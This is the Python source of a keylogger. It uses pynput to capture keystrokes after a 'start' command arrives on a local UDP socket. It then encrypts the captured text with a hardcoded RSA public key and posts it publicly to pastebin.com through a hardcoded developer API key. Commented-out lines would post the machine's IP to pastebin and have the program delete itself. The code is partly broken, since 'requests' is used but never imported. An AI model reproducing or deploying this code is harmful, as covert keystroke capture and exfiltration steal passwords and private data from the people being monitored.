from pynput.keyboard import Key, Listener
import socket
from pastebin import PastebinAPI
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

output = []


def on_press(key):
    if key == Key.enter:
        output.append("\n")
    elif key == Key.space:
        output.append(" ")
    else:
        output.append(str(key))


def key_thread():
    listener = Listener(on_press=on_press)
    listener.start()


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = "127.0.0.1"  # localhost
    port = 10101
    addr = (ip, port)
    sock.bind(addr)

    dev_key = '475b38cdfbba7a92d8bde6c56adfb241'
    pastebin_url = "http://pastebin.com/api/api_post.php"

    pubkey = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95UUVFbx17//PAKDAt2U' \
             b'\nX3eRxdobjR3GWs6KNLWKfkgJRjux8y3eoYZpugZHYyDptN0VjbxjrkOWhubDVeCv' \
             b'\nCHSBI7FUzf62bc5048zaifHFLQFselSD6zonc2p9w4oOjqmZj3POXEmB//mOXNFi' \
             b'\n8b0o5HYQWB084H3MgtijZBCMVLikbLrGYmpbUZatiHb48f5w2mNeUihDK9THsvf+\n3pk2Kp6e3VsMgaAtHztvt7NVKyPphtcYS' \
             b'/UTu1W/qIvTPWr2/utwsffo78o4e+SJ\n+zbMqbgAJieIv9cFFfebr3QNxQ4aDz5tO8YKLLfWqQBN9aoxUM2I8gBVbl378Vnk' \
             b'\nIwIDAQAB\n-----END PUBLIC KEY----- '

    # Code for posting IP to pastebin (not needed)
    # hostname = socket.gethostname()
    # ip = socket.gethostbyname(hostname)
    #
    # ip_data = {'api_dev_key': dev_key,
    #            'api_option': 'paste',
    #            'api_paste_code': str(ip),
    #            # 'api_paste_private': 0,
    #            'api_paste_name': 'url_test'}

    # ip_url = requests.post(url=pastebin_url, data=ip_data)
    # print(ip_url.text)  # print out URL of paste

    log_dir = "./"

    com = sock.recv(20).decode()
    print(com)
    started = False
    while com != "stop":
        if com == "start" and not started:
            key_thread()
            started = True
        print(output)
        com = sock.recv(20).decode()
        print(com)

    # Code for writing keylogger out to file for testing
    # fi = open(log_dir + "out.txt", "w")
    outstring = ''
    for i in output:
        b = i.replace("\'", '')  # convert keylogger data to readable string
        print(b)
        # fi.write(b)
        outstring = outstring + b
    # fi.close()

    # encode output string in RSA (uses hardcoded public key at start of main)
    key = RSA.importKey(pubkey)
    cipher = PKCS1_OAEP.new(key)
    outdata = outstring.encode()
    ciphertext = cipher.encrypt(outdata)

    # Paste keylogger data on pastebin after encrypting
    key_data = {'api_dev_key': dev_key,
                'api_option': 'paste',
                'api_paste_code': ciphertext,
                'api_paste_private': 0,
                'api_paste_name': 'key_test'}
    key_url = requests.post(url=pastebin_url, data=key_data)

    print(key_url.text)  # print out url of paste
    # remove(argv[0])  # delete program after running


if __name__ == "__main__":
    main()
